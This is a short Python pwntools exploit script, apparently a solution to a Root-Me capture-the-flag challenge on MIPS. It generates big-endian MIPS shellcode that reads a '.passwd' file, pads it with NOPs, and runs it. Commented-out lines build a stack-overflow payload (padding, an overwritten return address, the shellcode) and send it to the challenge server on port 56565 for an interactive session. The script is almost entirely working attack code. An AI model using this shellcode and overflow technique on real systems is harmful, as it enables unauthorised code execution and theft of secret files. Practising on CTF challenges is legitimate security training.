from pwn import *

# def toCode(bin):
#     res = ''
#     s = bin.encode('hex')
#     if len(s) % 2 == 1:
#         raise 'Shell craft length must be even'
#     for i in range(len(s)):
#         if i % 2 == 0: res += '\\x'
#         res += s[i]
#     return res

context.clear(arch = 'mips', os = 'linux', endian = 'big', bits = 32)
print vars(context)

s = pwnlib.shellcraft.mips.linux.cat('.passwd')
for i in range(3): s = pwnlib.shellcraft.mips.nop() + s
print s

p = run_assembly(s)
print p.recv()

# s = asm(s)
#
# stack = p32(0x7ffffc68 + 24, endian='big')
#
# payload = 'a'*20 + stack + s
# print len(payload)
#
# from socket import socket
# from telnetlib import Telnet
#
# sock = socket()
# sock.connect(('challenge03.root-me.org', 56565))
# print "> " + sock.recv(1024)
# sock.send(payload)
# print "> " + sock.recv(1024)
# #interactive mode
# t = Telnet()
# t.sock = sock
# t.interact()
# sock.close()

#
# r = remote('challenge03.root-me.org', 56565)
# res = r.recv(1024, timeout=2)
# print res
#
# r.interactive()
#
# r.sendline('aa')
# res = r.recv(1024, timeout=2)
# print res

# r.interactive()

# r.close()
